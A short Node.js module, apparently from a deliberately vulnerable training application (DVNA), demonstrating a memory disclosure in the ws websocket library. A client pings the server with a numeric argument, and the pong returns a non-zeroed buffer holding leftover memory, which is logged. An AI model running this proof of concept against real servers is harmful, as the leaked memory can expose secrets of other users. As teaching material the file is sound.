// This is a vulnerability in the ws module, a websocket library, that leads to remote memory disclosure.

var ws = require('ws')
var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')
var express = require('express');
var DVNA = express();

client.on('open', function () {
  console.log('open')
  client.ping(50) // this makes the server return a non-zeroed buffer of 50 bytes

  client.on('pong', function (data) {
    console.log('Memory previously allocated on Buffer leaked')
    console.log(data) // a non-zeroed out allocated buffer returned from the server
  })
})

module.exports = {
  path: 'memory_disclosure',
  server: DVNA
}